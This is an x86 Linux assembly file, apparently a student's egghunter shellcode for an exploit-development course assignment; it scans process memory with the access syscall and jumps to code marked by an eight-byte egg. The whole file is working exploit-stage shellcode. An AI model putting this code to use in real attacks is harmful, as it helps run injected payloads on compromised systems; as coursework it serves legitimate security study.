; John
;
; Egghunter Shellcode - Assignment 3
;
; SecurityTube Linux Assembler Expert (SLAE) 32-bit
;
; October 12, 2020


global _start

section .text

_start:

	; Below shellcode searches the program address space for the egg
	; Once found, execution control is passed to egg location
	mov ebx, 0x6a015f90	; load egg value
	xor ecx, ecx		; ecx = 0
	mul ecx			; eax and edx = 0
PageUp:
	or dx, 0xfff		; dx = 0x0fff
Increment:
	inc edx			; dx = 0x1000
	pusha			; preserve all registers onto stack
	lea ebx, [edx + 0x4]	; load address of edx+4 into ebx to check 4 bytes inside PAGE_SIZE
	mov al, 0x21		; access syscall = 33
	int 0x80		; system call
	cmp al, 0xf2		; is output equal to EFAULT value?
	popa
	jz PageUp		; jump back to try more addresses
	cmp [edx], ebx		; if not EFAULT, does [edx] = egg?
	jnz Increment		; try again if [edx] != egg
	cmp [edx + 0x4], ebx	; do next 4 bytes = egg?
	jnz Increment		; try again if [edx+0x4] != egg
	jmp edx			; pass control to egg-marked shellcode
